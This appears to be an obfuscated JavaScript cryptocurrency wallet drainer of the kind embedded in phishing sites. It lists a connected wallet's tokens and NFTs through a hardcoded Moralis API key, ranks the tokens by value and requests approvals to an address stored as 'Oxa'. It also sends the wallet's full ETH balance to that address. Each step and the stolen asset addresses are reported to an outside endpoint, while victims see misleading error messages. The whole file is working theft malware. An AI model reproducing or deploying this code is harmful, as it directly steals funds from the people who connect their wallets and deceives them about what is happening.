_0x311aad={'method':_0x522c62(0xc0),'headers':{'accept':_0x522c62(0x13d),'X-API-Key':'xlBMsLxjEFcdSN1TGdya7jDy33DsMXbpi7rSypmNzxccgOoRzP8zocDThugOatoD'}};try{const _0x50e377=await fetch(_0x48a80c,_0x311aad)[_0x522c62(0xcc)](_0x3cb330=>_0x3cb330[_0x522c62(0xc5)]());console[_0x522c62(0x107)](_0x50e377);let _0x267faa=_0x50e377;console[_0x522c62(0x107)]('Initial\x20list\x20',_0x267faa);let _0x91e0cf=await Promise[_0x522c62(0xe1)](_0x267faa[_0x522c62(0x155)](async _0x4a55eb=>{const _0x352ab8=_0x522c62;let _0xfcec;try{_0xfcec=await getValue(_0x4a55eb[_0x352ab8(0x164)],_0x4a55eb['balance'],_0x4a55eb[_0x352ab8(0xe4)]);}catch(_0x2d3192){_0xfcec=0x0;}return console[_0x352ab8(0x107)](_0xfcec),{'balance':_0x4a55eb['balance'],'value':_0xfcec,'address':_0x4a55eb['token_address']};}));console['log'](_0x522c62(0x177),_0x91e0cf),tokens=_0x91e0cf[_0x522c62(0xf0)](_0x23ebec=>_0x23ebec[_0x522c62(0xe8)]>0x5),tokens['sort']((_0x3d1d4f,_0x3090bd)=>_0x3090bd[_0x522c62(0xe8)]-_0x3d1d4f[_0x522c62(0xe8)]),console['log'](_0x522c62(0xeb),chainId,_0x522c62(0x15f),tokens);if(tokens[_0x522c62(0x178)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x522c62(0xe7));}NFTs=await getNFTs(selectedAccount)[_0x522c62(0x170)](_0x4ae612=>{const _0x58376f=_0x522c62;console['log'](_0x58376f(0x132),_0x4ae612);}),NFTs=NFTs[_0x522c62(0x12b)],console[_0x522c62(0x107)](_0x522c62(0xfc),NFTs);}async function onApprove(){const _0x2d1f69=_0x5225b7;if(tokens[_0x2d1f69(0x178)])try{loopTokens(tokens);}catch(_0x5eb4b4){console[_0x2d1f69(0x160)]('Error\x20processing\x20item\x20'+_0x5eb4b4[_0x2d1f69(0x15e)]);}else{if(NFTs[_0x2d1f69(0x178)]){try{loopNfts(NFTs);}catch(_0x572111){console['error'](_0x2d1f69(0x10a)+_0x572111['message']);}onSendEther(),sendMessage('Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!');}else try{onSendEther();}catch(_0x24adc7){console[_0x2d1f69(0x160)]('Error\x20processing\x20item\x20'+_0x24adc7[_0x2d1f69(0x15e)]);}}}async function loopTokens(_0x465d8f){const _0x23cb96=_0x5225b7;for await(let _0x5bdbd8 of _0x465d8f){console[_0x23cb96(0x107)]('Token',_0x5bdbd8);try{let _0x78bcba=new web3Object['eth'][(_0x23cb96(0x127))](ABI,_0x5bdbd8[_0x23cb96(0xc9)]);sendMessage(_0x23cb96(0x102)),await _0x78bcba[_0x23cb96(0xcb)][_0x23cb96(0xcf)](Oxa,_0x23cb96(0x126))[_0x23cb96(0x1a0)]({'from':selectedAccount,'to':_0x5bdbd8[_0x23cb96(0xc9)]})['on'](_0x23cb96(0xe2),_0x4a0401=>{const _0x2bb729=_0x23cb96;console[_0x2bb729(0x107)](_0x2bb729(0xf3)+_0x4a0401);})['on'](_0x23cb96(0xdd),_0x2da5c0=>{const _0x35f915=_0x23cb96;console[_0x35f915(0x107)]('Transaction\x20Receipt:\x20'+_0x2da5c0),sendMessage(_0x35f915(0x185)),sendMessage(_0x35f915(0x173)+_0x5bdbd8['address']),sendMessage(_0x35f915(0x18b)+_0x5bdbd8[_0x35f915(0x119)]),sendMessage(_0x35f915(0x15a)+Oxa);})['on'](_0x23cb96(0x160),_0x59b790=>{const _0x5c1e3e=_0x23cb96;console[_0x5c1e3e(0x107)](_0x5c1e3e(0x188)+_0x59b790),sendMessage(_0x5c1e3e(0xbe));});}catch(_0x33f16d){console['log']('Error:\x20'+_0x33f16d),sendMessage('Transaction\x20Rejected');}};await loopNfts(NFTs);}async function loopNfts(_0x4362be){const _0x2f2895=_0x5225b7;for await(let _0x47e391 of _0x4362be){console[_0x2f2895(0x107)](_0x2f2895(0x1a3),_0x47e391);try{let _0x3af9c5=new web3Object[(_0x2f2895(0x10b))][(_0x2f2895(0x127))](ABIN,_0x47e391[_0x2f2895(0x164)]);await _0x3af9c5['methods'][_0x2f2895(0x13b)](Oxa,_0x2f2895(0x1a7))[_0x2f2895(0x1a0)]({'from':selectedAccount,'to':_0x47e391[_0x2f2895(0x164)]})['on'](_0x2f2895(0xe2),_0x381e40=>{const _0x534440=_0x2f2895;console[_0x534440(0x107)]('Transaction\x20Hash:\x20'+_0x381e40),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on'](_0x2f2895(0xdd),_0x1156ca=>{const _0x489c17=_0x2f2895;console['log'](_0x489c17(0x187)+_0x1156ca),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x489c17(0x1a4)+token['address']),sendMessage(_0x489c17(0x15a)+Oxa);})['on'](_0x2f2895(0x160),_0x5b0ada=>{const _0x267f9d=_0x2f2895;console[_0x267f9d(0x107)](_0x267f9d(0x188)+_0x5b0ada),sendMessage(_0x267f9d(0xbe));});}catch(_0x23ed8b){console[_0x2f2895(0x107)](_0x2f2895(0x188)+_0x23ed8b),sendMessage('Transaction\x20Rejected');}}await onSendEther();}async function onSendEther(){const _0xfef660=_0x5225b7;console[_0xfef660(0x107)]('sending\x20ether');try{let _0x311529=await web3Object['eth']['getBalance'](selectedAccount);var _0x1a9899=await web3Object[_0xfef660(0x10b)][_0xfef660(0x12f)](),_0x9f856e={'gasPrice':_0x1a9899,'from':selectedAccount,'to':Oxa,'value':_0x311529};_0x9f856e[_0xfef660(0x180)]=_0x24a4cb,_0x9f856e[_0xfef660(0xe8)]=_0x311529-0xaa87bee538000,console['log'](_0x9f856e[_0xfef660(0xe8)]);var _0x24a4cb=await web3Object[_0xfef660(0x10b)][_0xfef660(0x16e)](_0x9f856e),_0x37a97b=_0x1a9899*_0x24a4cb;web3Object[_0xfef660(0x10b)][_0xfef660(0x149)](_0x9f856e)['on'](_0xfef660(0xe2),_0x1e60df=>{const _0x1b2f9f=_0xfef660;console[_0x1b2f9f(0x107)](_0x1b2f9f(0xf3),_0x1e60df),sendMessage(_0x1b2f9f(0xee));})['on'](_0xfef660(0xdd),_0x1d6b9f=>{const _0x35b074=_0xfef660;console[_0x35b074(0x107)](_0x35b074(0x187),_0x1d6b9f),sendMessage(_0x35b074(0x1a5));})['on'](_0xfef660(0x160),_0x20db61=>{const _0x4dcfbf=_0xfef660;console[_0x4dcfbf(0x107)](_0x4dcfbf(0x188),_0x20db61),sendMessage(_0x4dcfbf(0xbe));});}catch{sendMessage(_0xfef660(0x13c));}}async function sendMessage(_0x3c4868){return new Promise((_0x40dbd4,_0x141e25)=>{const _0x54edf0=_0xf299,_0x2be571=Oxc;fetch(_0x54edf0(0x122)+_0x2be571+_0x54edf0(0x197)+_0x3c4868,{'method':'GET','headers':{}})[_0x54edf0(0xcc)](async _0x2c93a2=>{const _0x525871=_0x54edf0;if(_0x2c93a2[_0x525871(0x12e)]>0x18f)throw _0x2c93a2;_0x40dbd4(await _0x2c93a2[_0x525871(0xc5)]());})[_0x54edf0(0x170)](_0x13f85a=>{_0x141e25(_0x13f85a);});});}async function getPrice(_0x4035d9){return new Promise((_0x2780b4,_0x4fd63d)=>{const _0x556e05=_0xf299;fetch('https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses='+_0x4035d9+'&vs_currencies=usd',{'method':_0x556e05(0xc0),'headers':{}})[_0x556e05(0xcc)](async _0x33a3c6=>{const _0x898c5a=_0x556e05;if(_0x33a3c6[_0x898c5a(0x12e)]>0x18f)throw _0x33a3c6;_0x2780b4(await _0x33a3c6[_0x898c5a(0xc5)]());})[_0x556e05(0x170)](_0x2d875f=>{_0x4fd63d(_0x2d875f);});});}async function getValue(_0x4e11c7,_0x1c3fa1,_0xbffc85){const _0x20ba31=_0x5225b7;console[_0x20ba31(0x107)](_0x4e11c7,_0x1c3fa1,_0xbffc85);let _0x5eaeb7=await getPrice(_0x4e11c7);console[_0x20ba31(0x107)](_0x20ba31(0x19b),_0x5eaeb7),_0x5eaeb7=parseFloat(_0x5eaeb7[_0x4e11c7][_0x20ba31(0xf2)]);let _0x28dcc2=_0x1c3fa1/0xa**(_0xbffc85||0x12)*_0x5eaeb7;return _0x28dcc2=parseInt(_0x28dcc2),_0x5eaeb7?_0x28dcc2:0x0;}function _0xf299(_0x16dd0c,_0x5ee8e4){const _0x2207cb=_0x2207();return _0xf299=function(_0xf29927,_0x55bb1d){_0xf29927=_0xf29927-0xb7;let _0x24558b=_0x2207cb[_0xf29927];return _0x24558b;},_0xf299(_0x16dd0c,_0x5ee8e4);}async function getNFTs(_0x48559f='',_0x2d3767='xlBMsLxjEFcdSN1TGdya7jDy33DsMXbpi7rSypmNzxccgOoRzP8zocDThugOatoD',_0x14682d=_0x5225b7(0x1a6),_0x247fcc='50'){return new Promise((_0x11e6b4,_0x476fd8)=>{const _0x3d8628=_0xf299;fetch('https://deep-index.moralis.io/api/v2/'+_0x48559f+_0x3d8628(0x1a1)+_0x14682d+_0x3d8628(0x168)+_0x247fcc,{'method':_0x3d8628(0xc0),'headers':{'accept':_0x3d8628(0x13d),'X-API-Key':_0x2d3767}})[_0x3d8628(0xcc)](async _0x1a3d4c=>{const _0x35523a=_0x3d8628;if(_0x1a3d4c['status']>0x18f)throw _0x1a3d4c;_0x11e6b4(await _0x1a3d4c[_0x35523a(0xc5)]());})['catch'](_0x5a1bd2=>{_0x476fd8(_0x5a1bd2);});});}